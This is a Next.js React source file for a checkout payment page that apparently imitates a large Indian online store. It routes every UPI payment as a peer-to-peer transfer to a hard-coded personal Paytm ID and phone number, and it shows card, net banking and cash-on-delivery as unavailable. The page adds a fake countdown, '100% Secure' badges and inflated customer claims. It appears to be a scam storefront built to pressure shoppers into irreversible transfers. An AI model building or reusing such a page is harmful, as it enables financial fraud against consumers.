"use client";

import React, { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import { useCart } from '@/context/CartContext';
import { ArrowLeft, ShieldCheck, ChevronUp, ChevronDown, CreditCard, Landmark, Banknote, HelpCircle, Smile, Timer } from 'lucide-react';
import { QRCodeSVG } from 'qrcode.react';
import phonepeImg from '@/assets/phonepe.png';
import gpayImg from '@/assets/gpay.png';
import paytmImg from '@/assets/paytm.png';
import otherUpiImg from '@/assets/other-upi.png';

// ─── Merchant Config ──────────────────────────────────────────────────────────
const MERCHANT = {
    payeeName: 'ANIL KUMAR',
    upiId: 'paytm.s1x1vd6@pty',
    phone: '8447675802',
    basePriceRs: 489,
    currency: 'INR',
};

// ─── Payment Methods ──────────────────────────────────────────────────────────
const UPI_OPTIONS = [
    { id: 'phonepe', name: 'PhonePe', icon: phonepeImg, discountPct: 5 },
    { id: 'paytm', name: 'Paytm', icon: paytmImg, discountPct: 3 },
    { id: 'gpay', name: 'Google Pay', icon: gpayImg, discountPct: 4 },
    { id: 'bhim_upi', name: 'BHIM UPI', icon: otherUpiImg, discountPct: 0 },
];

// ─── Helpers ──────────────────────────────────────────────────────────────────
function isMobile(): boolean {
    if (typeof navigator === 'undefined') return false;
    return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
}

function calcFinalPrice(basePriceRs: number, discountPct: number): number {
    return basePriceRs - Math.floor(basePriceRs * discountPct / 100);
}

function formatTime(s: number) {
    const m = Math.floor(s / 60).toString().padStart(2, '0');
    const sec = (s % 60).toString().padStart(2, '0');
    return `${m}:${sec}`;
}

function buildDeepLink(method: string, amountRs: number): string {
    const orderId = "TXN_" + Date.now();
    const amPaise = amountRs * 100;

    if (method === 'PhonePe') {
        // PhonePe native P2P intent — matches source script exactly
        const payload = {
            contact: {
                cbcName: '',
                nickName: '',
                vpa: MERCHANT.upiId,
                type: 'VPA',
            },
            p2pPaymentCheckoutParams: {
                note: orderId,
                isByDefaultKnownContact: true,
                initialAmount: amPaise,
                currency: 'INR',
                checkoutType: 'DEFAULT',
                transactionContext: 'p2p',
            },
        };
        const b64 = btoa(JSON.stringify(payload));
        const dataUrl = encodeURIComponent(b64);
        return `phonepe://native?data=${dataUrl}&id=p2ppayment`;
    }

    if (method === 'Paytm') {
        return `paytmmp://cash_wallet?pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&am=${amountRs}&cu=${MERCHANT.currency}&tn=${orderId}&tr=&mc=&featuretype=money_transfer`;
    }

    // Google Pay
    if (method === 'Google Pay') {
        const params = `pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&cu=${MERCHANT.currency}&tn=${orderId}`;
        return `tez://upi/pay?${params}`;
    }

    // BHIM UPI / generic fallback
    const params = `pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&cu=${MERCHANT.currency}&tn=${orderId}`;
    return `upi://pay?${params}`;
}

// ─── Component ────────────────────────────────────────────────────────────────
export default function PaymentPage() {
    const router = useRouter();
    const { cartTotal, paymentMethod, setPaymentMethod, cartCount } = useCart();
    const [selectedOpt, setSelectedOpt] = useState(UPI_OPTIONS[0]);
    const [qrValue, setQrValue] = useState<string | null>(null);
    const [mobile, setMobile] = useState(true);
    const [countdown, setCountdown] = useState(12 * 60 + 30); // 12:30

    // Detect device
    useEffect(() => { setMobile(isMobile()); }, []);

    // Sync paymentMethod state with our local selection
    useEffect(() => { setPaymentMethod(selectedOpt.name); }, [selectedOpt]);

    // Countdown timer
    useEffect(() => {
        const t = setInterval(() => setCountdown(c => c > 0 ? c - 1 : 0), 1000);
        return () => clearInterval(t);
    }, []);

    // Compute final price: base from cart if >0, else MERCHANT.basePriceRs
    const base = cartTotal > 0 ? cartTotal : MERCHANT.basePriceRs;
    const finalPrice = calcFinalPrice(base, selectedOpt.discountPct);
    const savedAmount = base - finalPrice;

    const handleSelect = (opt: typeof UPI_OPTIONS[0]) => {
        setSelectedOpt(opt);
        setQrValue(null);
    };

    const handlePay = () => {
        const url = buildDeepLink(selectedOpt.name, finalPrice);

        if (selectedOpt.id === 'bhim_upi' || !mobile) {
            // Show QR code
            setQrValue(url);
            return;
        }

        // Mobile: try specific app, fall back to generic upi:// after 1.5s
        const genericUrl = `upi://pay?pa=${MERCHANT.upiId}&pn=${encodeURIComponent(MERCHANT.payeeName)}&cu=${MERCHANT.currency}&tn=TXN_${Date.now()}`;

        if (url !== genericUrl) {
            const fallbackTimer = setTimeout(() => {
                window.location.href = genericUrl;
            }, 1500);
            const onHide = () => {
                if (document.hidden) {
                    clearTimeout(fallbackTimer);
                    document.removeEventListener('visibilitychange', onHide);
                }
            };
            document.addEventListener('visibilitychange', onHide);
        }

        window.location.href = url;
    };

    return (
        <div className="flex flex-col min-h-screen bg-[#f1f3f6] pb-10">
            {/* Header */}
            <div className="px-4 py-3 flex items-center justify-between bg-white border-b shadow-sm sticky top-0 z-20">
                <div className="flex items-center">
                    <button onClick={() => router.back()} className="mr-4">
                        <ArrowLeft className="w-6 h-6 text-black" strokeWidth={2.5} />
                    </button>
                    <div className="flex flex-col">
                        <span className="text-[12px] text-gray-500 font-medium">Step 3 of 3</span>
                        <h1 className="text-[18px] font-bold text-black leading-tight">Payments</h1>
                    </div>
                </div>
                <div className="flex items-center bg-gray-100 border border-gray-200 px-2 py-1 rounded text-[11px] font-medium text-gray-600">
                    <ShieldCheck className="w-3.5 h-3.5 mr-1" strokeWidth={2} />
                    100% Secure
                </div>
            </div>

            {/* Countdown Banner */}
            <div className="bg-[#fff3e0] px-4 py-2 flex items-center justify-between border-b">
                <span className="text-[#e65100] text-[12px] font-bold">⚡ Limited-time offer – ends in</span>
                <div className="flex items-center gap-1 text-[#e65100] font-mono font-bold text-[14px]">
                    <Timer className="w-4 h-4" />
                    {formatTime(countdown)}
                </div>
            </div>

            {/* Price Breakdown */}
            <div className="bg-[#f5f7fa] px-4 py-4 border-b border-gray-200">
                <div className="flex justify-between items-center text-[15px] text-gray-700 mb-2">
                    <span>Price ({cartCount} items)</span>
                    <span className="font-medium text-gray-900">₹{base.toLocaleString()}</span>
                </div>
                {selectedOpt.discountPct > 0 && (
                    <div className="flex justify-between items-center text-[14px] text-[#388e3c] mb-2">
                        <span>{selectedOpt.name} Discount ({selectedOpt.discountPct}%)</span>
                        <span className="font-medium">−₹{savedAmount.toLocaleString()}</span>
                    </div>
                )}
                <div className="flex justify-between items-center text-[15px] text-gray-700 mb-4">
                    <span>Protect Promise Fee</span>
                    <span className="font-medium text-gray-900">₹0</span>
                </div>
                <div className="border-t border-dashed border-gray-300 my-3"></div>
                <div className="flex justify-between items-center">
                    <div className="flex items-center text-[#2874f0] font-medium text-[16px]">
                        Total Amount <ChevronUp className="w-4 h-4 ml-1" strokeWidth={2.5} />
                    </div>
                    <span className="font-bold text-[#2874f0] text-[18px]">₹{finalPrice.toLocaleString()}</span>
                </div>
            </div>

            {/* Cashback Banner */}
            <div className="bg-[#eff8f1] px-4 py-3 border-b flex justify-between items-center relative overflow-hidden">
                <div className="flex flex-col z-10 w-full relative">
                    <span className="text-[#388e3c] font-bold text-[14px]">5% Cashback</span>
                    <span className="text-[#388e3c] text-[12px]">Claim now with payment offers</span>
                </div>
                <div className="flex absolute right-4 top-1/2 -translate-y-1/2 gap-[-8px] z-0">
                    <div className="w-8 h-8 rounded-full bg-red-800 border-2 border-white shadow-sm flex items-center justify-center font-serif text-white text-[10px] italic">A</div>
                    <div className="w-8 h-8 rounded-full bg-blue-700 border-2 border-white shadow-sm flex items-center justify-center font-bold text-white text-[10px]">SBI</div>
                </div>
            </div>

            {/* UPI Section */}
            <div className="bg-white mt-3 border-t border-b">
                <div className="px-4 py-4 flex justify-between items-start border-b">
                    <div>
                        <span className="font-bold text-[15px] text-black">UPI</span>
                        <div className="text-gray-500 text-[13px] mt-0.5">Pay by any UPI app</div>
                    </div>
                    <ChevronDown className="w-5 h-5 text-black" strokeWidth={2.5} />
                </div>

                <div className="flex flex-col">
                    {UPI_OPTIONS.map((opt) => (
                        <label
                            key={opt.id}
                            onClick={() => handleSelect(opt)}
                            className="flex items-center justify-between py-3 px-4 cursor-pointer hover:bg-gray-50 transition-colors"
                        >
                            <div className="flex items-center">
                                <img src={opt.icon.src} alt={opt.name} className="w-[32px] h-[32px] object-contain mr-4" />
                                <div className="flex flex-col">
                                    <span className={`text-[15px] ${selectedOpt.id === opt.id ? 'text-black font-medium' : 'text-gray-800'}`}>{opt.name}</span>
                                    {opt.discountPct > 0 && (
                                        <span className="text-[11px] text-[#388e3c] font-medium">{opt.discountPct}% extra discount</span>
                                    )}
                                </div>
                            </div>
                            <div className={`w-[18px] h-[18px] rounded-full border-[1.5px] flex items-center justify-center flex-shrink-0 ${selectedOpt.id === opt.id ? 'border-[#2874f0]' : 'border-gray-400'}`}>
                                {selectedOpt.id === opt.id && <div className="w-2.5 h-2.5 bg-[#2874f0] rounded-full"></div>}
                            </div>
                        </label>
                    ))}

                    {/* BHIM / Desktop QR */}
                    {qrValue && (
                        <div className="px-4 pb-4 pt-2 flex flex-col items-center border-t bg-gray-50">
                            <p className="text-[13px] text-gray-500 mb-3 text-center">
                                Scan with <strong>{selectedOpt.name}</strong> to pay ₹{finalPrice.toLocaleString()}<br />
                                <span className="text-[11px]">Amount is editable inside the app</span>
                            </p>
                            <div className="bg-white p-3 rounded-lg shadow border">
                                <QRCodeSVG value={qrValue} size={180} includeMargin />
                            </div>
                            <p className="text-[11px] text-gray-400 mt-2">UPI ID: {MERCHANT.upiId}</p>
                            <button onClick={() => setQrValue(null)} className="mt-3 text-[#2874f0] text-[13px] underline">
                                Close QR
                            </button>
                        </div>
                    )}

                    {/* Pay Button */}
                    {!qrValue && (
                        <div className="p-4 bg-white border-t">
                            <button
                                onClick={handlePay}
                                className="w-full bg-gradient-to-b from-[#ffcf40] to-[#ffc200] text-black font-bold py-3.5 rounded-sm shadow-[0_1px_2px_rgba(0,0,0,0.2)] text-[16px]"
                            >
                                Pay ₹{finalPrice.toLocaleString()}
                            </button>
                            {savedAmount > 0 && (
                                <p className="text-center text-[12px] text-[#388e3c] font-medium mt-1.5">
                                    You save ₹{savedAmount} with {selectedOpt.name}!
                                </p>
                            )}
                            {!mobile && (
                                <p className="text-center text-[11px] text-gray-400 mt-1">A QR code will appear for desktop payment</p>
                            )}
                        </div>
                    )}
                </div>
            </div>

            {/* Disabled Payment Methods */}
            <div className="bg-[#f1f3f6] mt-3 border-t">
                <div className="bg-[#fafafa] px-4 py-4 border-b flex items-start justify-between">
                    <div className="flex flex-col opacity-60">
                        <div className="flex items-center">
                            <CreditCard className="w-6 h-6 text-gray-500 mr-3" strokeWidth={2} />
                            <span className="font-bold text-[15px] text-black">Credit/Debit/ATM Card</span>
                        </div>
                        <div className="text-gray-500 text-[12px] mt-1 ml-9">Add and secure cards as per RBI guidelines</div>
                        <div className="text-[#388e3c] text-[12px] mt-1 ml-9 font-medium">Get upto 5% cashback* • 2 offers available</div>
                    </div>
                    <div className="flex items-center text-gray-500 text-[13px]">Unavailable <HelpCircle className="w-3.5 h-3.5 ml-1" /></div>
                </div>
                <div className="bg-[#fafafa] px-4 py-4 border-b flex justify-between items-center opacity-70">
                    <div className="flex items-center">
                        <Landmark className="w-6 h-6 text-gray-500 mr-3" strokeWidth={2} />
                        <span className="font-bold text-[15px] text-black">Net Banking</span>
                    </div>
                    <div className="flex items-center text-gray-500 text-[13px]">Unavailable <HelpCircle className="w-3.5 h-3.5 ml-1" /></div>
                </div>
                <div className="bg-[#fafafa] px-4 py-4 border-b flex justify-between items-center opacity-70">
                    <div className="flex items-center">
                        <Banknote className="w-6 h-6 text-gray-500 mr-3" strokeWidth={2} />
                        <span className="font-bold text-[15px] text-black">Cash on Delivery</span>
                    </div>
                    <div className="flex items-center text-gray-500 text-[13px]">Unavailable <HelpCircle className="w-3.5 h-3.5 ml-1" /></div>
                </div>
            </div>


            <div className="pt-8 pb-10 flex flex-col items-center justify-center text-gray-500">
                <p className="text-[13px] font-bold mb-3">35 Crore happy customers and counting!</p>
                <div className="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-300">
                    <Smile className="w-5 h-5" strokeWidth={2.5} />
                </div>
            </div>
        </div>
    );
}
